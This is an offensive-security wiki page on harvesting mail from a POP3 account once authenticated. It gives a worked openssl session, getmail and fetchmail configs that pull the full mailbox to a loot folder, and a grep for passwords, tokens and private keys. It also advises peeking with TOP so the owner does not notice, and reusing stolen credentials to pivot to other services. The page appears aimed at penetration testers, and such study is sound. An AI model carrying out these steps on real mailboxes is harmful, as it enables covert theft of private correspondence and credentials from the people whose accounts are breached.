---
title: "Mailbox access: downloading and looting mail over POP3"
description: "Driving an authenticated POP3 session for loot: STAT and LIST to size the mailbox, TOP to peek at headers without deleting, and RETR to pull full messages. Dumps every message in a worked loop, greps for secrets, and uses fetchmail or getmail for bulk download, with care around POP3's delete-on-retrieve behavior."
keywords:
  - pop3 retr
  - pop3 top
  - mail harvesting
  - fetchmail
  - getmail
---

# Mailbox access

Once authenticated, POP3 gives you a numbered list of messages in the single maildrop and three commands that matter: `STAT` and `LIST` to size and enumerate it, `TOP n 0` to read a message's headers without pulling (or deleting) the body, and `RETR n` to download the full message. There is no folder model and no server-side search, so the technique is simply "pull everything and grep locally". The loot is the same as any mailbox: plaintext credentials, reset and enrollment links, attachments, and the account's correspondence.

## Preconditions

An authenticated session ([authentication](authentication.md)), on 995 or STLS so the mail is not mirrored on-path.

## The delete-on-retrieve trap

POP3 clients classically issue `DELE` after `RETR` and then `QUIT`, which permanently removes mail server-side. The protocol itself does not delete on `RETR`; the client does. So as long as you never send `DELE` and you end with `RSET` or a plain `QUIT` without having marked anything deleted, the mailbox is left intact. When you must stay invisible to the mailbox owner, use `TOP n 0` to read headers (and `TOP n 50` for the first lines of body) rather than `RETR`, since peeking leaves no deletion marks. Never let an automated client run its default fetch-and-delete against a live mailbox you need to preserve.

## Worked session

```bash
openssl s_client -connect <target>:995 -quiet
USER alice
+OK
PASS Sprint2025!
+OK Logged in.
STAT
+OK 12 48210                       # 12 messages, 48210 bytes total
LIST
+OK 12 messages:
1 3312
2 10290
...
.
TOP 7 0
+OK
From: it-helpdesk@corp.local
Subject: Temporary credentials for the new portal
Date: Mon, 22 Sep 2025 09:11:04 +0000
.
RETR 7
+OK 2048 octets
...full message including body and attachments...
.
QUIT
+OK Logging out.
```

Read the numbers: `STAT` gives count and total size, `LIST` gives per-message sizes so you can prioritize the big ones (attachments) or skip them. `TOP 7 0` prints message 7's headers and zero body lines; use it to triage subjects and senders across the whole maildrop cheaply, then `RETR` only the promising ones. Each multi-line response terminates with a line containing a single `.`.

## Bulk download and triage

For the whole maildrop, let a POP3 client pull everything to a Maildir once, then mine offline. Force leave-on-server so nothing is deleted.

```bash
# getmail: retrieve without deleting
cat > ~/.getmail/loot <<'EOF'
[retriever]
type = SimplePOP3SSLRetriever
server = <target>
port = 995
username = alice
password = Sprint2025!
[destination]
type = Maildir
path = ~/loot/alice/
[options]
delete = false
read_all = true
EOF
getmail --rcfile loot

# fetchmail equivalent (keep mail on server)
fetchmail -p POP3 --ssl -u alice --keep -m 'procmail -d %T' <target>

# mine the result
grep -rniE 'password|passwd|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH) PRIVATE KEY' ~/loot/alice/ | head
```

`delete = false` / `--keep` is the safety switch: without it both tools delete server-side after download. For a quick interactive pull without a config file, a short loop over `RETR` piped through `openssl s_client` writes every message to disk in one pass.

## Follow-on

Reuse recovered credentials and tokens against other services immediately, extract attachments for documents and further secrets, and map the account's contacts from message headers for the next pivot. Because POP3 has no `Sent` folder concept, if IMAP is also exposed on the same account prefer [IMAP mailbox access](../imap/mailbox-access.md) to reach sent mail and archives.

## Tools

- [getmail](https://github.com/getmail6/getmail6)
- [fetchmail](https://www.fetchmail.info/)

## References

- [RFC 1939: STAT, LIST, RETR, TOP, DELE](https://datatracker.ietf.org/doc/html/rfc1939#section-5)
- [HackTricks: pentesting POP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html)
